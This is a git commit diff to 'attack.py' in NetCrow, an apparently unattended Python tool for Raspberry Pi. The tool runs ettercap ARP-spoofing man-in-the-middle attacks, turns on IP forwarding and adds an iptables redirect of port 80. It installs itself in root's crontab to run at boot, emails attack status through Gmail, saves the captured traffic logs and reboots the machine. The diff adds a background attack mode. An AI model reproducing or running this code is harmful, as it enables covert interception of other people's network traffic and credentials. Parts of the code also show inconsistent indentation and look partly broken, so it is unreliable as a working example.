b24f0dea51beb3cb6abcc36b7a5d5d4a365e18ac
Raspberryy <Raspberryy@users.noreply.github.com>
2016-10-29 23:52:10 +0200

    Update attack.py

--- attack.py
+++ attack.py
@@ -11,15 +11,9 @@ from email.mime.text import MIMEText
 
 # Define Attributes
 
-Version = "2.4"
+Version = "3.0"
 Creator = "Raspberry"
 Published = "https://github.com/Raspberryy/NetCrow"
-
-nettest = 0
-SendBoot = 0
-BootBol = 0 
-rebootbol = 0
-Path = os.path.dirname(os.path.abspath(__file__))
 
 Sender = ""
 Password = ""
@@ -27,6 +21,14 @@ Reciever = ""
 
 SaveDelay = 15		# Time Delay before Saving 
 ReRun = 10		# Repetition of Saving
+FinishExecution = "reboot" # Possible "reboot" "shutdown" "stay" - Standart "reboot"
+
+nettest = 0
+SendBoot = 0
+BootBol = 0 
+Path = os.path.dirname(os.path.abspath(__file__))
+
+
 
 
 # Define Colours
@@ -41,60 +43,41 @@ bold = '\033[1m'
 under = '\033[4m'
 
 
-# Define Functions
+# Define Main Function
 
-def AutoStart():
-
-        os.system("sudo crontab -l > mycron")
-        CommandString = "sudo echo \'@reboot sh " + Path + "/launcher.sh > " + Path + "/Logging/cronlog 2>&1  \' >> mycron"
-        os.system(CommandString)
-        os.system("sudo crontab mycron")
-        os.system("sudo rm mycron")
-        CommandLauncher = "echo \'sudo python " + Path + "/attack.py\' > launcher.sh"
-        os.system(CommandLauncher)
-
-def AutoStartDis():
-
-        # Warn User
-        print ""
-        print red + "           All Crontab Jobs are going to be deleted!!!" + white
-        print ""
-        print ""
-        raw_input("     Press any Key to continue...")
-        print ""
-
-        # Delete Jobs
-        os.system("crontab -r")
-
-        # Delete Launcher.sh
-        dellaun = "rm " + Path + "/launcher.sh"
-        os.system(dellaun)
-
-def SendMail(Subject, Text):
-
-	# Connect to Server
-	server = smtplib.SMTP('smtp.gmail.com', 587)
-	server.ehlo()
-	server.starttls()
-	server.ehlo
-	server.login(Sender, Password)
+def BootingAttack():
 	
-	# Set Text and Subject
-	Message = 'Subject: %s\n\n%s' % (Subject, Text)
-
-
-	# Sending Email
+	if SendBoot != 1:
+		SendBootUp()
+		
 	try:
-	        server.sendmail(Sender, Reciever, Message)
+        StartAttack()
 	except:
-		Time = (datetime.datetime.now()).strftime("%H:%M:%S")
-        	Date = time.strftime("%d/%m/%Y")
-		tempcmd = "echo Email sending Fail -  " + Time + " the " + Date + " > error.log"
-		os.system(tempcmd)
-	server.quit()
+        ErrSub = "Starting the Atttack FAILED"
+        try:
+			interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
+			interface_get = os.popen(interface_comm).read()
+			UpTimeTemp = GetUpTime()
+			interface = interface_get[0:4]
+			ErrText = "Connection to Internet               Yes \nConnection to Network via " + interface + "\nUptime                             " + UpTimeTemp
+        except:
+			ErrText = "Connection to Internet               Yes \nConnection to Network             No" + "\nUptime                            " + UpTimeTemp
+			SendMail(ErrSub, ErrText)
 
 
- 
+	# Preparing Reboot
+	AutoEmailSend()
+	SaveOldFile()
+	os.system("rm "+ Path  + "/ettercap.txt")
+	if rebootbol != 1:
+	        os.system("reboot")	
+
+
+
+
+
+# Define Main-Sub-Functions
+
 def SendBootUp():
 	
 	# Send Mail after Boot
@@ -111,8 +94,8 @@ def SendBootUp():
 	ipaddress_get = os.popen(ipaddress_comm).read()
 	Text = "Interface	    " + interface +"\nNetwork IP	" + ipaddress_get  
 	SendMail(Sub, Text)
-
-
+	
+	
 def StartAttack():
 	
 	# Set up Interface String
@@ -135,12 +118,14 @@ def StartAttack():
         else:
                 command = "ettercap -T -q -i " + interface + " -M arp // // >" + Path + "/ettercap.txt &"
                 os.system(command)
-	
-	
+
+				
+				
 def GetUpTime():
 	UpRead = os.popen("uptime").read()
 	UpTime = UpRead[12:25]
 	return UpTime
+
 
 def AutoEmailSend():
 	
@@ -164,7 +149,31 @@ def AutoEmailSend():
 
 	# Sending Email
 	SendMail(SubjectAttackFinished, TextAttackFinished)
-		
+
+
+def SendMail(Subject, Text):
+
+	# Connect to Server
+	server = smtplib.SMTP('smtp.gmail.com', 587)
+	server.ehlo()
+	server.starttls()
+	server.ehlo
+	server.login(Sender, Password)
+	
+	# Set Text and Subject
+	Message = 'Subject: %s\n\n%s' % (Subject, Text)
+
+
+	# Sending Email
+	try:
+	        server.sendmail(Sender, Reciever, Message)
+	except:
+		Time = (datetime.datetime.now()).strftime("%H:%M:%S")
+        	Date = time.strftime("%d/%m/%Y")
+		tempcmd = "echo Email sending Fail -  " + Time + " the " + Date + " > error.log"
+		os.system(tempcmd)
+	server.quit()	
+	
 def SaveOldFile():
 
 	SaveStat = 0 
@@ -176,31 +185,96 @@ def SaveOldFile():
 		else:
 			commtemp = "cp " + Path  + "/ettercap.txt " + Path  + "/Logging/ettercap" + str(vartemp)  + ".txt"
                         os.system(commtemp)
-			SaveStat = 1 
+			SaveStat = 1
+	return
 
+def FinishExe():
+	
+	if FinishExecution == "reboot":
+		os.system("reboot")
+	if FinishExecution == "shutdown":
+		os.system("shutdown now")
+	if FinishExecution == "stay":
+		print yellow + "[*]" + white + "NetCrow has finished Working - Close it manually"
+		
+	
+# Define Sub-Functions	
+	
+def AutoStart():
+	
+	os.system("sudo crontab -l > mycron")
+	CommandString = "sudo echo \'@reboot sh " + Path + "/launcher.sh > " + Path + "/Logging/cronlog 2>&1  \' >> mycron"
+	os.system(CommandString)
+	os.system("sudo crontab mycron")
+	os.system("sudo rm mycron")
+	CommandLauncher = "echo \'sudo python " + Path + "/attack.py\' > launcher.sh"
+	os.system(CommandLauncher)
+
+def AutoStartDis():
+	
+	# Warn User
+	print ""
+	print red + "           All Crontab Jobs are going to be deleted!!!" + white
+	print ""
+	print ""
+	raw_input("     Press any Key to continue...")
+	print ""
+	
+	# Delete Jobs
+	os.system("crontab -r")
+
+	# Delete Launcher.sh
+	dellaun = "rm " + Path + "/launcher.sh"
+	os.system(dellaun)
+
+	
 def AttackOnly():
 	
 	# Set up Interface String
-        interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
-        interface_get = os.popen(interface_comm).read()
-        interface = interface_get[0:4]
-        if interface == "wlan":
-                interface = "wlan0"
+	interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
+	interface_get = os.popen(interface_comm).read()
+	interface = interface_get[0:4]
+	if interface == "wlan":
+		interface = "wlan0"
+		
+	# Set up Environment
+	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
 
-        # Set up Environment
-        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-        os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+	# Start Ettercap
+	try:
+		command = "ettercap -T -q -i " + interface + " -M arp /// ///"
+		os.system(command)
+	except:
+		print red + "Error - Starting Ettercap failed" + white
+	else:
+		command = "ettercap -T -q -i " + interface + " -M arp // //"
+		os.system(command)	
+		
+def BackgroundAttack():
+	
+	# Set up Interface String
+	interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
+	interface_get = os.popen(interface_comm).read()
+	interface = interface_get[0:4]
+	if interface == "wlan":
+		interface = "wlan0"
+		
+	# Set up Environment
+	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+	os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
 
-        # Start Ettercap
-        try:
-                command = "ettercap -T -q -i " + interface + " -M arp /// ///"
-                os.system(command)
-        except:
-                print red + "Error - Starting Ettercap failed" + white
-        else:
-                command = "ettercap -T -q -i " + interface + " -M arp // //"
-                os.system(command)	
-
+	# Start Ettercap
+	try:
+		command = "ettercap -T -q -i " + interface + " -M arp /// /// > " + Path + "/Logging/cronlog 2>&1"
+		os.system(command)
+	except:
+		print red + "Error - Starting Ettercap failed" + white
+	else:
+		command = "ettercap -T -q -i " + interface + " -M arp // // > " + Path + "/Logging/cronlog 2>&1"
+		os.system(command)
+	
+		
 def TestMail():
 	SendMail("It works!", "This is a Test-Mail generated by NetCrow")	
 
@@ -221,6 +295,7 @@ def PrintHelp():
 	print ""
 	print "	Command List:"
 	print "	 -a             Start Attack manually"
+	print "	 -b             Start Attack in Background"
 	print "	 -d             Delete Backups in Logging"	
 	print "	 -h --help	Prints this"	
 	print "	 -r 		Prevent Reboot"
@@ -229,36 +304,6 @@ def PrintHelp():
 	print "	 --AutoStart-enable     Enable automatical Boot"
         print "	 --AutoStart-disable    Disable automatical Boot"
 	print ""
-
-
-def BootingAttack():	
-	if SendBoot != 1:
-        	SendBootUp()
-
-	try:
-        	StartAttack()
-	except:
-        	ErrSub = "Starting the Atttack FAILED"
-        	try:
-                	interface_comm = "route -n | grep 'UG[ \t]' | awk '{print $8}'"
-                	interface_get = os.popen(interface_comm).read()
-                	UpTimeTemp = GetUpTime()
-                	interface = interface_get[0:4]
-                	ErrText = "Connection to Internet               Yes \nConnection to Network via " + interface + "\nUptime                             " + UpTimeTemp
-        	except:
-                	ErrText = "Connection to Internet               Yes \nConnection to Network             No" + "\nUptime                            " + UpTimeTemp
-		
-        	SendMail(ErrSub, ErrText)
-
-
-	# Preparing Reboot
-	AutoEmailSend()
-	SaveOldFile()
-	os.system("rm "+ Path  + "/ettercap.txt")
-	if rebootbol != 1:
-	        os.system("reboot")	
-
-
 
 
 
@@ -283,11 +328,6 @@ elif sys.argv[2]=="--help":
         PrintHelp()
 	BootBol = 1
 
-elif sys.argv[1]=="-r":
-	rebootbol = 1
-elif sys.argv[2]=="-r":
-	rebootbol = 1
-
 elif sys.argv[1]=="-a":
 	AttackOnly()
 	BootBol = 1
@@ -295,6 +335,13 @@ elif sys.argv[2]=="-a":
 	AttackOnly()
 	BootBol = 1
 
+elif sys.argv[1]=="-b":
+	BackgroundAttack()
+	BootBol = 1
+elif sys.argv[2]=="-b":
+	BackgroundAttack()
+	BootBol = 1
+	
 elif sys.argv[1]=="-s":
         SendBoot = 1
 elif sys.argv[2]=="-s":
